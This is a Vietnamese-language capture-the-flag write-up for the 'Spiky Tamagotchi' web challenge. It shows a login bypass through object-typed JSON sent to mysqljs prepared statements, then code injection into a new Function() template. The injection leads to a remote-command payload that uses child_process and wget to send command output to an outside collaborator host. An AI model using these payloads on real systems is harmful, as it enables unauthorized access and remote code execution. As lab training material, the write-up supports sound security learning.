# `CHALLENGE DESCRIPTION`

<table>
<th style="text-align: center">
<img width="600" height="1">

```
CHALLENGE INFO
```

</th>

<th style="text-align: center">
<img width="350" height="1">

```
TABLE OF CONTENT
```

</th>
<tr>

<td width="600">      

<code> Spiky Tamagotchi </code>

Captain Spiky comes from a rare species of creatures who can only breathe underwater. During the energy-crisis war, he was captured as a war prisoner and later forced to be a Tamagotchi pet for a child of a general of nomadic tribes. He is forced to react in specific ways and controlled remotely purely for the amusement of the general's children. The Paraman crew needs to save the captain of his misery as he is potentially a great asset for the war against Draeger. Can you hack into the Tamagotchi controller to rescue the captain?

**Tags:** 

</td>

<td>
<img width="600" height="1">

- [`CHALLENGE DESCRIPTION`](#challenge-description)
- [`QUICK PREVIEW`](#quick-preview)
- [`EXPLOITAION`](#exploitaion)
	- [Source Code Analysis](#source-code-analysis)
	- [Remote Code Execution](#remote-code-execution)
	- [`👽` Get Flag](#-get-flag)
- [`Reference`](#reference)
</td>

</tr></table>

# `QUICK PREVIEW`

Đây là một bài White Box, chúng ta được cung cấp source code của Web App.

Sau khi giải nén folder `SpikyTamagotchi.zip`, ta được folder có cấu trúc như sau: 

```shell
SpikyTamagotchi
└── web_spiky_tamagotchi
    ├── challenge
	│   ├── helpers
	│   │   ├── JWTHelper.js
	│   │   └── SpikyFactor.js
	│   ├── middleware
	│   │   └── AuthMiddleware.js
	│   ├── static
	│   │   ├── css
	│   │   ├── images
	│   │   └── js
	│   ├── routes
	│   │   └── index.php
	│   ├── views
	│   │   ├── index.html
	│   │   └── interface.html
	│   ├── database.js
	│   ├── index.php
    │   └── package.json
    ├── config
	│   └── supervisord.conf
	├── build-docker.sh
	├── Dockerfile
	└── flag.txt
```

→  Ta có cái nhìn tổng quan về Web App, sử dụng techonology:
+ alpine docker
+ node.js
+  express.js
+ mysql

Đây là giao diện trang index của Web App:

![](../../attachments/Pasted%20image%2020220727225817.png)

# `EXPLOITAION`
Điều ta quan tâm bây giờ là làm thế nào để login được vào website.


## Source Code Analysis
Trong file routes/index.js, việc login sẽ được thực hiện thông qua api `api/login` giá trị nhận vào sẽ là username và password thông qua `req.body`. Api/login kiểm tra user bằng method `loginUser()` của Database.

```javascript
<--SNIP-->

router.post('/api/login', async (req, res) => {
	const { username, password } = req.body;

	if (username && password) {
		return db.loginUser(username, password)
			.then(user => {
				let token = JWTHelper.sign({ username: user[0].username });
				res.cookie('session', token, { maxAge: 3600000 });
				return res.send(response('User authenticated successfully!'));
			})
			.catch(() => res.status(403).send(response('Invalid username or password!')));
	}
	return res.status(500).send(response('Missing required parameters!'));
});

<--SNIP-->

```

Method `loginUser()` sẽ nhận 2 tham số và đưa chúng vào một `prepared statement`.  `Prepared statement` khá là an toàn nếu `type` của input được đưa vào đúng như mong đợi của chương trình.

 ```javascript
<--SNIP-->

	async loginUser(user, pass) {
		return new Promise(async (resolve, reject) => {
			let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
            this.connection.query(stmt, [user, pass], (err, result) => {
                if(err || result.length == 0)
                    reject(err)
                resolve(result)
            })
		});
	}
	
<--SNIP-->
```

Quan sát request khi thực hiện đăng nhập vào website

```http
POST /api/login HTTP/1.1
Host: 68.183.36.105:32261
Content-Length: 45
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://68.183.36.105:32261
Referer: http://68.183.36.105:32261/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"username":"username",
	"password":"password"
}
```

Type của 2 input khi đưa vào statement đều là `string`, vậy sẽ ra sao nếu type là `int`. Okay, cùng kiểm tra thử nha.

![](../../attachments/Pasted%20image%2020220727165716.png)

Việc thông báo lỗi này là do `nodejs`. Bởi khi parsing object, nếu value của key bằng `0` thì `nodejs` sẽ hiểu rằng ở đó không có `value`. 

Nhưng có 1 trick để khiến `nodejs` parsing `0` thành 1 giá trị số, đó là biến nó thành 1 object.  Cụ thể như sau

![](../../attachments/Pasted%20image%2020220727170932.png)

→ Hoàn toàn hợp lệ.  Bây giờ chỉ còn việc bypass phần xác thực nữa là xong.

> Tại sao mình lại test với value = 0. Bởi có một fun fact trong SQL đó là nếu ta so sánh 1 columns có các giá trị mang kiểu `string` với `số 0` thì sẽ bằng nhau.  

Đây là ví dụ minh hoạ

![](../../attachments/Pasted%20image%2020220727171614.png)
```sql
SELECT * FROM users WHERE username=0;
-- 2 câu querry này là tương đương nhau
SELECT * FROM users WHERE;
```

> Thực ra khi mình giải bài này lần đầu tiên thì việc dùng payload trên là mình đã có thể đăng nhập vào được. Nhưng khi tới lượt làm lại thì nó báo không thành công. [Đây là một ví dụ](../../attachments/Pasted%20image%2020220727224618.png)

```http
POST /api/login HTTP/1.1
Host: 68.183.36.105:32261
Content-Length: 45
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://68.183.36.105:32261
Referer: http://68.183.36.105:32261/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"username":[
		0
	],
	"password":{
		{ "password":1 }
	}
}
```

Prepared statement ban đầu:

```sql
SELECT username FROM users WHERE username = ? AND password = ?
```

Lúc này sẽ trở thành như bên dưới:

```sql
SELECT username FROM users WHERE username = 0 AND password = `password` = 1
```

Nếu đăng nhập thành công, respone sẽ trả về trông như sau:

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU4OTE2NDE0fQ.gyAZ-40AyUK560qnUrFZ1Ftpt532vDEHYZA7rK10w5E; Max-Age=3600; Path=/; Expires=Wed, 27 Jul 2022 11:06:54 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 46
Date: Wed, 27 Jul 2022 10:06:54 GMT
Connection: close

{"message":"User authenticated successfully!"}
```

Bây giờ copy cookie vào website là ta đã đăng nhập thành công!

## Remote Code Execution

Truy cập vào endpoint `/interface`, ta có giao diện trò chơi nuôi thú như dưới:

Có các hành động `Feed`, `Play`, `Sleep` . Các hành động này được thực hiện thông qua `/api/activity`

![](../../attachments/Pasted%20image%2020220727173139.png)

Quay lại source code, trong file `routes/index.js`, ta thấy các user-inputs được đưa vào `SpikyFactor.calculate()` (một method của object `SpikyFactor`).

```javascript
router.get('/interface', AuthMiddleware, async (req, res) => {
	return res.render('interface.html');
});

router.post('/api/activity', AuthMiddleware, async (req, res) => {
	const { activity, health, weight, happiness } = req.body;
	if (activity && health && weight && happiness) {
		return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
			.then(status => {
				return res.json(status);
			})
			.catch(e => {
				res.send(response('Something went wrong!'));
			});
	}
	return res.send(response('Missing required parameters!'));
});
```

Các user-inputs lúc này tiếp tục rơi vào biến `res`. Cụ thể hơn là rơi vào các `templated`. Lúc này ta có thể thực hiện inject vào templated của biến `activity` (Bởi vì 3 biến kia đã parse thành `int`, còn activity vẫn giữa nguyên là `string`)

```javascript
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
            const {m, hp, w, hs} = quickMaths();
            resolve({mood: m, health: hp, weight: w, happiness: hs})
        }
        catch (e) {
            reject(e);
        }
    });
}
```

Đây là request feed, mình đã modify các số thành 0 để dễ quan sát

![](../../attachments/Pasted%20image%2020220727174622.png)

Để kiểm tra, mình có thể sử dụng payload như sau:

![](../../attachments/Pasted%20image%2020220727174738.png)

→  Kết quả trả về như nhau →  Bị template injection.

Tiếp theo mình chuẩn bị một vài payload khác để xem thử mình có sử dụng được hàm eval không.

```http
POST /api/activity HTTP/1.1
<--SNIP-->

{"activity":"fe' + 'ed' && 1==1 && 'feed","health":"0","weight":"0","happiness":"0"}
```

```http
POST /api/activity HTTP/1.1
<--SNIP-->

{"activity":"fe' + 'ed' && eval(1==1) && 'feed","health":"0","weight":"0","happiness":"0"}
```

Kết quả trả về đều như nhau:

```http
HTTP/1.1 200 OK
<--SNIP-->

{"mood":"cry","health":5,"weight":10,"happiness":5}
```

Bây giờ tìm thông qua eval để thực hiện RCE, mình đã thử google và có được 1 kết quả khá thú vị [here](https://stackoverflow.com/questions/22572182/node-referenceerror-require-is-not-defined-when-executing-a-function-object)

Và đây là payload của mình:

```http
POST /api/activity HTTP/1.1
<--SNIP-->

{"activity":"fe' + 'ed' && eval('var require = global.require || global.process.mainModule.constructor._load; require(\"child_process\").exec(\"wget http://<burp-collabtor-client>?id=`<command>`\")') && 'feed","health":"0","weight":"0","happiness":"0"}
```

> Thay thế: `<burp-collabtor-client>` và `<command>` là lệnh mình muốn execute.

## `👽` Get Flag

Thực hiện list file `flag` ở thư mục root

![](../../attachments/Pasted%20image%2020220727225158.png)

Thực hiện lấy nội dung `flag` 

![](../../attachments/Pasted%20image%2020220727225300.png)

# `Reference`

[Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql | by Flatt Security Inc. | Medium](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)